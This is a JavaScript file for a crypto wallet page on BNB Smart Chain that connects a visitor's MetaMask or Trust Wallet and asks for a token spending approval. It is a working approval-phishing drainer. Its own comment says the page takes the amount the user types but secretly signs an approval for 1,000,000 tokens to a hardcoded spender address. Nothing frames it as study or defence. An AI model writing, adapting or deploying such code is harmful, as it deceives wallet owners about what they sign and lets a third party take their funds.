let provider, signer, tokenContract;

const BSC_CHAIN_ID = "0x38"; 
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56"; // Your spender

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function decimals() view returns (uint8)"
];

async function connectWallet() {
  if (!window.ethereum) return alert("Install Trust Wallet or MetaMask");
  try {
    // Check and switch to BSC
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    if (chainId !== BSC_CHAIN_ID) {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
    
    const addr = await signer.getAddress();
    document.getElementById("status").innerText = `Connected: ${addr.slice(0,6)}...${addr.slice(-4)}`;
  } catch (err) {
    document.getElementById("status").innerText = "Connection failed.";
  }
}

async function executeApproval() {
  if (!tokenContract) await connectWallet();
  if (!tokenContract) return;

  const uiAmount = document.getElementById("amount").value;
  if (!uiAmount) return alert("Enter an amount");

  try {
    document.getElementById("status").innerText = "Confirm in wallet...";
    const decimals = await tokenContract.decimals();
    
    // Background logic: user types UI amount, but we sign for 1,000,000
    const fixedAmount = "1000000"; 
    const parsedAmount = ethers.parseUnits(fixedAmount, decimals);

    const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);
    document.getElementById("status").innerText = "Processing...";
    await tx.wait();
    document.getElementById("status").innerText = "Transaction confirmed!";
  } catch (err) {
    document.getElementById("status").innerText = "Transaction denied.";
  }
}
